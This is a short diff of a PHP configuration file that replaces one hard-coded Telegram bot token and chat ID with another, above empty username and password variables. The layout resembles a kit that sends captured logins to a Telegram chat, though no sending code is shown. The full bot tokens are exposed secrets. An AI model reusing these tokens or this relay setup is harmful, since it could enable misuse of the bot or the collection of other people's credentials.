@@ -1,7 +1,7 @@
 <?php
 
-$bot_token = '8658565330:AAFBDPWe4dMctwn03JNNatLM_TuNiFittBw';
-$chat_id = '8658565330';
+$bot_token = '8998367498:AAEJ-ULg-8Ai3T7IJ9GBajDOG_rn_uHMfmk';
+$chat_id = '6614104922';
 
 $username = '';
 $password = '';
